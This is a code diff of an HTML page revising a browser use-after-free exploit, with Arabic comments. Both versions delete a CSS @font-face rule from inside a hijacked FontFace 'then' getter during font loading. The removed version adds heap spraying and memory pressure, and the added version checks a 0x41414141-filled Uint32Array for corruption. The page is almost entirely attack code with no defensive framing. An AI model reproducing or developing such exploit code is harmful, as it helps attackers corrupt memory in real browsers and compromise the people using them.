@@ -1,72 +1,47 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <style id="fontStyle">
-        @font-face { font-family: 'TargetFont'; src: url(nonexistent.woff); }
+    <style id="s">
+        @font-face { font-family: x; src: url(nonexistent.woff); unicode-range: U+0042; }
     </style>
 </head>
 <body>
-    <div id="status" style="color: #0f0; font-family: monospace;">System Initialized...</div>
+    <div id="debug" style="color: #0f0; font-family: monospace;">Testing...</div>
 
     <script>
-        const status = document.getElementById('status');
-        let spray = [];
-        let pressure = [];
+        const debug = document.getElementById('debug');
+        const MAGIC_VALUE = 0x41414141;
 
-        function log(msg) { status.innerText += "\n[+] " + msg; }
+        // المصفوفة الضحية (Target Object)
+        let victim = new Uint32Array(32);
+        victim.fill(MAGIC_VALUE);
 
-        // تقنية Spray متطورة باستخدام Float64Array للتحكم في الـ Butterfly
-        function performHeapSpray() {
-            for (let i = 0; i < 2000; i++) {
-                // مصفوفة من النوع Float64 تضمن وضع البيانات في هيكل الـ ArrayBuffer (داخل الـ IsoHeap)
-                let arr = new Float64Array(32);
-                arr[0] = 1.1; // القيمة المرجعية للتحقق
-                spray.push(arr);
-            }
-        }
-
-        function triggerUAF() {
-            log("Triggering UAF...");
-            
-            // تهيئة الضغط الذاكري لإجبار الـ Allocator على إعادة استخدام المكان
-            for (let i = 0; i < 1000; i++) pressure.push(new Array(64));
-
-            let font = new FontFace('TargetFont', 'local(Arial)', { unicodeRange: 'U+0041' });
-            document.fonts.add(font);
+        function testOverlap() {
+            let A = new FontFace('x', 'local(Arial)', { unicodeRange: 'U+0041' });
+            document.fonts.add(A);
 
             Object.defineProperty(FontFace.prototype, 'then', {
                 get() {
-                    // 1. الحذف (تحرير المساحة)
-                    document.getElementById('fontStyle').sheet.deleteRule(0);
+                    document.getElementById('s').sheet.deleteRule(0);
                     
-                    // 2. الملء الفوري (استبدال الـ CSSFontFace بكائننا)
-                    performHeapSpray();
+                    // لحظة الحقيقة: هل تغيرت قيم المصفوفة الخاصة بنا؟
+                    let corrupted = false;
+                    for (let i = 0; i < victim.length; i++) {
+                        if (victim[i] !== MAGIC_VALUE) {
+                            corrupted = true;
+                            debug.innerText = "SUCCESS: Memory corrupted at index " + i + " | Value: " + victim[i].toString(16);
+                            break;
+                        }
+                    }
+                    if (!corrupted) debug.innerText = "FAILED: Memory intact (No Overlap).";
                     
                     return undefined;
                 }
             });
-
-            font.load();
+            document.fonts.load('1em x', 'AB');
         }
 
-        // اختبار التداخل (Memory Overlap Check)
-        function verify() {
-            let found = false;
-            for (let i = 0; i < spray.length; i++) {
-                // إذا تغيرت القيمة، فهذا يعني أن الكائن قد تم استبداله في الذاكرة
-                if (spray[i][0] !== 1.1) {
-                    log("SUCCESS: Memory overlap at index " + i);
-                    found = true;
-                    break;
-                }
-            }
-            if (!found) log("Status: Buffers intact. (Try adjusting spray size)");
-        }
-
-        window.onload = () => {
-            setTimeout(triggerUAF, 1000);
-            setTimeout(verify, 2000);
-        };
+        setTimeout(testOverlap, 1000);
     </script>
 </body>
 </html>
